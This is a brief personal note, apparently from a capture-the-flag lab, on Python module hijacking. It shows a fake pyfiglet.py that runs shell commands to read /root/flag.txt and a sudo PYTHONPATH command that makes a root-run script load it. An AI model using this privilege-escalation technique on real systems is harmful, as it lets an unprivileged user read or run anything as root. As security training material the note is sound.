---
share_link: https://share.note.sx/0cfr98wu#tdbuq+4TWp35uvFyrCTI9WLJTi7n7fbdMUSJQp2iJ0U
share_updated: 2025-03-31T02:35:05+02:00
---

We can use this technique in case we have a python script that runs as `sudo` without a password.

![](https://i.imgur.com/4rjrfGa.png)


we check the script and we can see it uses a library called `pyfiglet`.

![](https://i.imgur.com/ZcrUW3a.png)

In module hijacking we change the path of Python libraries so it runs our own library.

in this case we create a file  `/tmp/pyfiglet.py` which has the following content

```python
import os
# os.system('ls -la /root') # testing and checking flag location
os.system('cat /root/flag.txt')
```

we run the following command

```sh
sudo PYTHONPATH=/tmp/ /usr/bin/python3 /opt/cool.py
```

and we are presented with the flag.
